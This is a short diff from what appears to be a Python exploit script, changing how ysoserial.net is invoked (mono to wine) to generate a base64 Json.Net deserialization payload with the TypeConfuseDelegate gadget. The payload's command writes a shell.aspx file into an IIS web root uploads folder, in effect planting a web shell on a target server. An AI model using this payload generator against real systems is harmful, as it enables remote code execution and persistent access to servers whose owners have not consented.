@@ -60,7 +60,7 @@ RAND_PARAM = random_string(6)  # Generates a random parameter name
 
 # 🛠️ Generates the Payload Using ysoserial.net
 def generate_payload():
-    cmd = ["mono", "ysoserial.exe", "-g", "TypeConfuseDelegate", "-f", "Json.Net", "-o", "base64",
+    cmd = ["wine", "ysoserial.exe", "-g", "TypeConfuseDelegate", "-f", "Json.Net", "-o", "base64",
            "-c", "echo 'webshell' > C:\\inetpub\\wwwroot\\uploads\\shell.aspx"]
     
     result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
